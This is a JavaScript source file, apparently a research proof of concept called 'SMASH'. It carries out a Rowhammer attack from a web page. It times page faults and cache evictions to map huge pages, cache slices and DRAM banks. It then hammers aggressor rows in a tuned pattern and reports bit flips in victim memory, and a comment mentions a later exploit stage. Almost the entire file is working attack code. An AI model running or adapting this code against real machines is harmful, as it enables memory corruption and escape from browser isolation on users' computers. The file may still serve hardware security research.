/* --- Constants --- */

const verbose = false;

const gb = 2**30;
const mb = 2**20;
const kb = 2**10;

const tREFI = 7800;
const cacheLineSize = 64;
const numReps = 30;

const numberOfActivations = 2 * 10**6;
const dataPatterns = [ 0xff, 0x00, 0xaa, 0x55 ];

const cacheAssociativity = 16;
const busWidth = 8;
const numberOfHugePages = 100;
const numberOfPages = numberOfHugePages * 512;

const numberOfSlices = 8;
const numberOfColumns = 2**10;
const numberOfOffsetsPerPage = 4;

const reducedAssociativity = 6;
const cycleLength = 2 * cacheAssociativity;

/* --- Target-specific parameters --- */

/* NOTE: the oto..() family of functions (see below) is also target-specific */

const numberOfBanks = 16;
const numberOfPairs = 9;
const numberOfCycles = 3;

let numberOfHitPairs;
let assembly;

if (reducedAssociativity == 3) { /* ~500 XORs */
  numberOfHitPairs = 13;
  assembly = 0xc00c03;
} else if (reducedAssociativity == 6) { /* ~1000 XORs */
  numberOfHitPairs = 10;
  assembly = 0xc330c33;
}

/* --- Functions --- */

function timeInSeconds(after, before) {
  return ((after - before) / 1000).toFixed(2);
}

function reportTime(str) {
  let timeNow = performance.now();
  let lap = timeInSeconds(timeNow, timeZero);
  let total = timeInSeconds(timeNow, firstTimeZero);

  if (verbose) {
    console.log("[Time s/s/m/m] " + str, lap, total, Math.round(lap / 60),
      Math.round(total / 60));
  } else if (str == "Bit flip") {
    console.log("(Bit flip)", total, "s");
  } else {
    console.log("Done.", total, "s");
  }

  timeZero = timeNow;
}

function assert(x) {
  if (!x) {
    throw "Assertion failed";
  }
}

function median(x) {
  x.sort();
  let y = x[Math.floor((x.length + 1) / 2) - 1]
    + x[Math.ceil((x.length + 1) / 2) - 1];
  return y / 2;
}

/*
 * Taken from https://developer.mozilla.org/en-US/docs/Web/
 * JavaScript/Reference/Global_Objects/Math/random
 */
function getRandomInt(max) {
  return Math.floor(Math.random() * Math.floor(max));
}

/* Page offset to column */
function otoc(o) {
  const hash = 0x1ff8;
  return (o & hash) >> 3;
}

/* Page offset to cache set */
function otot(o) {
  const hash = 0xffc0;
  return (o & hash) >> 6;
}


/* Page offset to cache slice */
function otos(o) {
  const hash = [ 0x5, 0x3, 0x1, 0x6, 0x3 ];

  let s = 0;

  o = o >> 16;

  for (let i = 0; i < hash.length; i++) {
    s = s ^ ((o >> i) & 0x1) * hash[i];
  }

  return s;
}

/* Nonzero bits */
function nzb(x) {
  let y = 0;

  while (x) {
    y += x & 0x1;
    x = x >> 1;
  }

  return y;
}

/* Page offset to bank */
function otob(o) {

  /* DRAM addressing functions */
  let hash = [ 0x2040, 0x24000, 0x48000, 0x90000 ];

  let b = 0;
  for (let i = 0; i < hash.length; i++) {
    b = b ^ ((nzb(o & hash[i]) % 2) << i);
  }

  return b;
}

/* Page offset to parity of 18 */
function otopar(o) {
  return (o >> 18) & 0x1;
}

/* Buffer index to page offset */
function itoo(i) {
  return (i - hugePageAtPages[0] * 4 * kb) & (2 * mb - 1);
}

/* Page offset and huge page index to buffer index */
function otoi(o, hugePageIndex) {
  return hugePageAtPages[hugePageIndex] * 4 * kb + o;
}

function getSameSlice(hugePageIndex, slice, oddParityOnly) {
  let subSet = [];

  for (let o = 0; o < 2 * mb; o += 2**16) {
    if (otos(o) == slice) {
      if (!oddParityOnly || !otopar(o)) {
        subSet.push(otoi(o, hugePageIndex));
      }
    }
  }

  return subSet;
}

function evict(evictionSet) {
  for (let i = 0; i < cacheAssociativity; i++) {
    dummy[0] = buf8[evictionSet[i]];
  }
}

function fastEvictionSet() {
  console.log("Looking for first eviction set... ");

  const factor = 3;

  /* Permutation and huge page to slice */
  function phtos(p, h) {
    return (p >> (3 * h)) & 0x7;
  }

  let evictionSet = new Array(20);

  /* Get five huge pages */
  let numberOfHugePages = 5;

  /* Cracking the "permutation" lock */
  let medians = [Infinity, Infinity];

  for (let p = 0; p < numberOfSlices**numberOfHugePages; p++) {
    for (let h = 0; h < numberOfHugePages; h++) {
      let s = phtos(p, h);
      evictionSet.splice(h * numberOfOffsetsPerPage, numberOfOffsetsPerPage,
        ...getSameSlice(h, s, false));
    }

    /* Does it evict? */
    let median = isEvictionSetReliable(evictionSet, numReps);

    if (verbose && median != 1) console.log(p, median);

    if (median > factor * medians[0] && median > factor * medians[1]) {
      if (verbose) console.log(p, medians[1], medians[0], median);

      for (let i = 0; i < evictionSet.length; i += numberOfOffsetsPerPage) {
        if (verbose) console.log(evictionSet[i], otos(itoo(evictionSet[i])));
      }

      break;
    }

    medians[1] = medians[0];
    medians[0] = median;
  }

  return evictionSet;
}

function sliceXOR(matches, x) {
  for (let i = 0; i < matches.length; i++) {
    matches[i] ^= x;
  }

  return matches;
}

function sliceMatcher(evictionSet, hugePageAtPages) {
  console.log("Learning slice color of " + numberOfHugePages + " huge pages... ");

  const epsilon = 2;

  let testSet = new Array(...evictionSet);
  let matches = new Array(hugePageAtPages.length);

  for (let h = 0; h < 5; h++) {
    matches[h] = otos(itoo(evictionSet[h * numberOfOffsetsPerPage]));
  }

  for (let h = 5; h < hugePageAtPages.length; h++) {

    let prev = 0;

    for (let s = 0; s < numberOfSlices; s++) {
      testSet.splice(0, numberOfOffsetsPerPage, ...getSameSlice(h, s, false));

      let median = isEvictionSetReliable(testSet, numReps);

      /* NOTE: improve by giving warning if there is no match at all */
      if (prev) {
        if (Math.abs(median - prev) > epsilon) {
          if (median > prev) {
            matches[h] = s;
          } else {
            matches[h] = s - 1;
          }

          if (verbose) console.log(h, s);

          break;
        }
      }

      prev = median;
    }
  }

  return matches;
}

function getAggressors(matches, hugePageAtPages) {
  if (verbose) console.log("Creating aggressors...");

  let aggressors = [];

  let standardBits = 2**15 ^ 2**18 ^ 2**10 ^ 2**11;

  /*
   * Flipping additional bits to evade set dueling (i.e., some particular cache
   * sets have a slightly different replacement policy)
   */
  let extraBits = 2**7;
  assert(extraBits != 0);

  for (let h = 0; h < hugePageAtPages.length; h++) {
    let aggressorsFromPage = getSameSlice(h, matches[h], true);

    /* Might happen because of slice function */
    if (aggressorsFromPage.length == 0) {
      continue;
    }

    for (let i = 0; i < aggressorsFromPage.length; i++) {
      aggressors.push(otoi(itoo(aggressorsFromPage[i]) ^ extraBits, h));
      aggressors.push(otoi(itoo(aggressorsFromPage[i]) ^ extraBits ^
        standardBits, h));
    }
  }

  return aggressors;
}

function verifyAggressorEvict(singleBankAggressors) {
  console.log("Verifying whether aggressors are self-evicting...");

  /* Create a few random eviction sets */
  let numberOfTests = 10;
  let missThreshold = 15;

  for (let n = 0; n < numberOfTests; n++) {
    let testSet = new Array(20);
    let seen = [];

    let start = getRandomInt(singleBankAggressors.length);

    for (let i = 0; i < testSet.length; i++) {

      let a = (start + 2 * getRandomInt(10**2)) % singleBankAggressors.length;

      while (seen.includes(a)) {
        a = (start + 2 * getRandomInt(10**2)) % singleBankAggressors.length;
      }
      seen.push(a);

      testSet[i] = singleBankAggressors[a];
    }

    let median = isEvictionSetReliable(testSet, numReps);

    if (verbose) console.log(n, median, seen);

    if (median < missThreshold) {
      console.log("WARNING: aggressors are NOT self-evicting");
    }
  }

  console.log("Aggressors are self-evicting");
}

function isEvictionSetReliable(evictionSet, reps) {
  const reasonableUpperLimit = 1000;

  let median = reasonableUpperLimit;
  while (median >= reasonableUpperLimit) {
    median = isEvictionSet(evictionSet, reps);
  }

  return median;
}

function isEvictionSet(evictionSet, reps) {
  let times = new Array(reps);

  for (let r = 0; r < reps; r++) {

    var before = performance.now();

    for (let a = 0; a < (2 * 10**4); a++) {
      evict(evictionSet);
      dummy[0] ^= buf8[evictionSet[cacheAssociativity]];
      dummy[0] ^= buf8[evictionSet[cacheAssociativity + 1]];
      dummy[0] ^= buf8[evictionSet[cacheAssociativity + 2]];
      dummy[0] ^= buf8[evictionSet[cacheAssociativity + 3]];
    }

    var after = performance.now();

    times[r] = after - before;
  }

  return median(times);
}

function Victims(selection, singleBankAggressors, victimByte) {
  let len = singleBankAggressors.length;

  this.victimByte = victimByte;

  this.victims = [];
  this.aggressors = [];

  for (let k = 0; k < 2 * numberOfPairs; k += 2) {
    /* Assuming low aggressor comes first, high aggressor later */
    this.victims.push(
      this.columnSet(this.rowAdd(singleBankAggressors[selection[k]], -1), 0));
    this.victims.push(
      this.columnSet(this.rowAdd(singleBankAggressors[selection[k]], 1), 0));
    this.victims.push(
      this.columnSet(this.rowAdd(singleBankAggressors[selection[k + 1]], 1), 0));

    let i0 = this.victims.length;
    for (let i = i0; i < i0 + 3 * numberOfColumns - 3; i++) {
      this.victims.push(this.columnAdd(this.victims[i - 3], 1));
      assert(this.columnsAdjacent(this.victims[i], this.victims[i - 3]));
    }

    this.aggressors.push(this.columnSet(singleBankAggressors[selection[k]], 0));
    this.aggressors.push(this.columnSet(singleBankAggressors[selection[k + 1]], 0))

    let j0 = this.aggressors.length;
    for (let j = j0; j < j0 + 2 * numberOfColumns - 2; j++) {
      this.aggressors.push(this.columnAdd(this.aggressors[j - 2], 1));
      assert(this.columnsAdjacent(this.aggressors[j], this.aggressors[j - 2]));
    }

  }

  for (let v = 0; v < this.victims.length; v++) {
    for (let b = 0; b < busWidth; b++) {
      buf8[this.victims[v] + b] = victimByte;
    }
  }

  for (let a = 0; a < this.aggressors.length; a++) {
    for (let b = 0; b < busWidth; b++) {
      buf8[this.aggressors[a] + b] = victimByte ^ 0xff;
    }
  }

  assert(this.victims.length == numberOfPairs * 3 * numberOfColumns);
  assert(this.aggressors.length == numberOfPairs * 2 * numberOfColumns);

  /* Couple of tests */
  for (let n = 0; n < 10**2; n++) {
    let a = this.victims[getRandomInt(this.victims.length)];
    let b = this.victims[getRandomInt(this.victims.length)];
    let c = this.aggressors[getRandomInt(this.aggressors.length)];
    assert(this.sameBank(a, b, c));
  }
}

Victims.prototype.sameBank = function(a, b, c) {
  return (otob(itoo(a)) == otob(itoo(b)) && otob(itoo(a)) == otob(itoo(c)));
}

Victims.prototype.columnsAdjacent = function(a, b) {
  return (otoc(itoo(a)) - otoc(itoo(b)) == 1);
}

Victims.prototype.rowAdd = function(a, x) {
  let base = a - itoo(a);
  a = itoo(a);

  /*
   * Carry bit might cause trouble, sometimes the assertion
   * below will fail, whatever
   */
  let pre = (a >> 17) & 0x7;
  a += x * 2**17;
  a ^= (((a >> 17) & 0x7) ^ pre) << 14; /* Preserve bank */

  assert(base + a >= 0);
  return base + a;
}


Victims.prototype.columnSet = function(v, x) {
  let base = v - itoo(v);
  v = itoo(v);

  let pre = (v >> 6) & 0x1;
  v = (v & ~0x1ff8) ^ (x << 3);
  v ^= (((v >> 6) & 0x1) ^ pre) << 13; /* Preserve bank */

  assert(base + v >= 0);
  return base + v;
}

Victims.prototype.columnAdd = function(v, x) {
  let base = v - itoo(v);
  v = itoo(v);

  let pre = (v >> 6) & 0x1;
  v += x * 2**3;
  v ^= (((v >> 6) & 0x1) ^ pre) << 13; /* Preserve bank */

  assert(base + v >= 0);
  return base + v;
}

Victims.prototype.gotFlip = function() {
  let flipCount = 0;

  for (let v = 0; v < this.victims.length; v++) {
    for (let b = 0; b < busWidth; b++) {
      let got = buf8[this.victims[v] + b];

      if (got === undefined) {
        console.log("Oops", this.victims[v] + b, "is undefined")
        return;
      }

      if (got != this.victimByte) {
        reportTime("Bit flip");
        flipCount++;

        let gbOffset = this.victims[v] + b;
        let mbOffset = gbOffset % (2 * mb);
        let byteOffset = mbOffset % 8;

        console.log(gbOffset, mbOffset, byteOffset,
          this.victimByte.toString(16), "->", got.toString(16));
      }
    }
  }

  return flipCount;
}

function install(pattern, debug) {
  for (let i = 0; i < pattern.length; i++) {
    buf32[pattern[i] >> 2] = pattern[(i + 2) % pattern.length] >> 2;
  }
}

function buildAny(selection, singleBankAggressors, assembly) {
  let pattern = new Array(numberOfCycles * cycleLength);

  /* Otherwise we move into the next cache line */
  assert(numberOfCycles < (cacheLineSize / singleBankAggressors.BYTES_PER_ELEMENT));

  /* Build it */
  let k = 0
  let l = 0;
  for (let i = 0; i < numberOfCycles; i++) {
    for (let j = 0; j < cycleLength; j++) {

      if ((assembly >> j) & 0x1) { /* Aggressor that misses */
        pattern[i * cycleLength + j] = singleBankAggressors[
          selection[k % (2 * numberOfPairs)]];
        k++;
      } else if (i == 0) { /* Aggressors that misses first, hits later */
        pattern[i * cycleLength + j] = singleBankAggressors[
          selection[2 * numberOfPairs + l % (2 * numberOfHitPairs)]];
        l++;
      } else { /* Aggressor that hits */
        pattern[i * cycleLength + j] = pattern[(i - 1) * cycleLength + j];
      }

      /* (1 << 2) because sizeof Uint32 */
      pattern[i * cycleLength + j] += i * (1 << 2);
    }
  }

  return pattern;
}

function hammer(t, singleBankAggressors, numberOfXORs) {
  var low = singleBankAggressors[t] >> 2;
  var high = singleBankAggressors[t + 1] >> 2;

  for (let i = 0; i < numberOfActivations; i++) {
    for (let k = 0; k < numberOfXORs; k++) {
      k ^= k ^ k;
    }

    for (let j = 0; j < numberOfCycles * cacheAssociativity; j++) {
      /*
       * Nested index because we have to release the inner buffer later,
       * when we start the exploit
       */
      low = bufbuf32[low >> 10][low & 0x3ff];
      high = bufbuf32[high >> 10][high & 0x3ff];
    }
  }

  return low ^ high;
}

function hammerBench(t, singleBankAggressors, numberOfXORs) {
const innerReps = 10**5;

  let times = new Array(numReps);

  for (let i = 0; i < times.length; i++) {
    var low = singleBankAggressors[t] >> 2;
    var high = singleBankAggressors[t + 1] >> 2;

    let before = performance.now();

    for (let l = 0; l < innerReps; l++) {

      for (let k = 0; k < numberOfXORs; k++) {
        k ^= k ^ k;
      }

      for (let j = 0; j < numberOfCycles * cacheAssociativity; j++) {
        low = bufbuf32[low >> 10][low & 0x3ff];
        high = bufbuf32[high >> 10][high & 0x3ff];
      }

    }

    let after = performance.now();

    times[i] = (after - before) / innerReps;
  }

  let nanoseconds = median(times) * 10**6;

  return tREFI / nanoseconds;
}

/*
 * We amplify page fault delays to detect whether the first huge page in our
 * buffer starts at either offset 0 or 1 MB
 */
function amplifiedPopulate() {
  let before = performance.now();

  for (let i = 0; i < 250; i++) {
    let j = 1.5 * mb + i * 4 * mb;

    /* MAP_POPULATE */
    buf8[j] = j;
    buf8[j + mb] = j + mb;
  }
  let after = performance.now();

  return after - before;
}

function aggressorSelection(t, len) {
  let selection = [t, t + 1];

  for (let i = 1; i < numberOfPairs + numberOfHitPairs; i++) {
    let pick;

    do {
      pick = (2 * getRandomInt(len)) % len;
    } while (selection.includes(pick));

    selection.push(pick);
    selection.push(pick + 1);
  }

  assert(selection.length == 2 * (numberOfPairs + numberOfHitPairs));

  return selection;
}

function computeHugePagesAtPages(offset) {
  let hugePageAtPages = new Array(numberOfHugePages);
  let offsetToPage = Math.round((offset * mb) / (4 * kb));

  for (let i = 0; i < numberOfHugePages; i++) {
    hugePageAtPages[i] = offsetToPage + i * 512;
  }

  return hugePageAtPages;
}

function populate() {
  for (let i = 0; i < gb; i += 4 * kb) {
    buf8[i] = i;
  }
}

/* --- Start --- */

alert("SMASH!?");

/* --- Detect page alignment --- */

let timeZero = performance.now();
let firstTimeZero = timeZero;

/* Vars for hoisting, don't use lets here */
var dummy = new Uint8Array(new ArrayBuffer(4 * kb));
var buf8 = new Uint8Array(new ArrayBuffer(1 * gb));
var buf32 = new Uint32Array(buf8.buffer);

let offset;
let epsilon = 20;
let times = [];

let time = Math.round(amplifiedPopulate());

if (time > 75) {
  offset = 0;
} else {
  offset = 1;
}

if (verbose) reportTime("Alignment");

console.log("First huge page in ArrayBuffer is at", offset, "MB");
let hugePageAtPages = computeHugePagesAtPages(offset);
if (verbose) console.log(hugePageAtPages);
assert(hugePageAtPages.length == numberOfHugePages);
populate();

var bufbuf32 = new Array(numberOfPages);
for (let i = 0; i < numberOfPages; i++) {
bufbuf32[i] = new Uint32Array(buf8.buffer, i * 4 * kb, 4 * kb);
}

/* --- Try to find pages with same slice color --- */
let evictionSet = fastEvictionSet();
reportTime("First eviction set");

let matches = sliceMatcher(evictionSet, hugePageAtPages);
reportTime("Colors of", numberOfHugePages, "huge pages");

let totalFlipCount = 0;

/* Changing colors to get different addresses, different banks */
out:
for (let xor = 0; xor < numberOfSlices; xor++) {
  matches = sliceXOR(matches, xor);

  let aggressors = new Uint32Array(getAggressors(matches, hugePageAtPages));
  if (verbose) reportTime("All aggressors");
  assert(aggressors.length > 0);

  for (let bank = 0; bank < numberOfBanks; bank++) {

    let singleBankAggressors = aggressors.filter(a => otob(itoo(a)) == bank);
    if (verbose) reportTime("Single bank aggressors");

    if (singleBankAggressors.length == 0) {
      continue;
    }

    for (let i = 0; i < singleBankAggressors.length; i++) {
      if (verbose) console.log(i, singleBankAggressors[i],
        otos(itoo(singleBankAggressors[i])),
        otob(itoo(singleBankAggressors[i])),
        otot(itoo(singleBankAggressors[i])));
    }

    verifyAggressorEvict(singleBankAggressors);
    reportTime("Aggressor eviction test");

    /* --- Synchronization --- */
    const ratioEpsilon = 0.02;

    let ratioTarget = 2.50;
    let initialNumberOfXORs = 1000;
    let XORstep = 100;
    let minXORstep = 20;

    console.log("Soft sync... (XORs, tREFI/t)");

    while (true) {
      selection = aggressorSelection(0, singleBankAggressors.length);
      let pattern = buildAny(selection, singleBankAggressors, assembly);
      install(pattern, false);
      let ratio = hammerBench(0, singleBankAggressors,
        initialNumberOfXORs).toFixed(2);

      console.log("(" + initialNumberOfXORs + ", " + ratio + ")");

      let diff = Math.abs(Math.round(ratio) - ratio);
      if (diff <= ratioEpsilon || Math.abs(diff - 0.5) <= ratioEpsilon) {
        break;
      }

      XORstep = Math.round(XORstep * 0.8);
      if (XORstep < minXORstep) XORstep = minXORstep;

      if (ratio > ratioTarget) { /* Too fast */
        initialNumberOfXORs += XORstep;
      } else { /* Too slow */
        initialNumberOfXORs -= XORstep;
      }

      if (initialNumberOfXORs < 0) {
        initialNumberOfXORs = 0;
        break;
      }
    }

    reportTime("Soft sync");

    let numberOfXORs = initialNumberOfXORs;

    console.log(
      "Hammering... (totalFlipCount, aggressorID, numberOfXORs, dataPattern)");

    for (t = 0; t < singleBankAggressors.length; t += 2) {
      let subFlipCount = 0;

      for (let i = 0; i < dataPatterns.length; i++) {
        selection = aggressorSelection(t, singleBankAggressors.length);

        let victims = new Victims(selection, singleBankAggressors, dataPatterns[i]);
        let pattern = buildAny(selection, singleBankAggressors, assembly);
        install(pattern, true);

        assert(t % 2 == 0);
        dummy[0] = hammer(t, singleBankAggressors, numberOfXORs);

        let flipCount = victims.gotFlip();
        subFlipCount += flipCount;

        if (verbose) {
          console.log(subFlipCount, totalFlipCount, t,
            singleBankAggressors.length, numberOfXORs,
            dataPatterns[i].toString(16), selection);
        } else {
          console.log(totalFlipCount, t, numberOfXORs, dataPatterns[i].toString(16));
        }
      }

      totalFlipCount += subFlipCount;

      if (totalFlipCount >= 2) {
        console.log("Enough for today, goodbye");
        reportTime("Goodbye");
        break out;
      }
    }

    reportTime("Bank " + bank);
  }

  reportTime("XOR " + xor);
}

if (dummy[0]) console.log(dummy[0]);
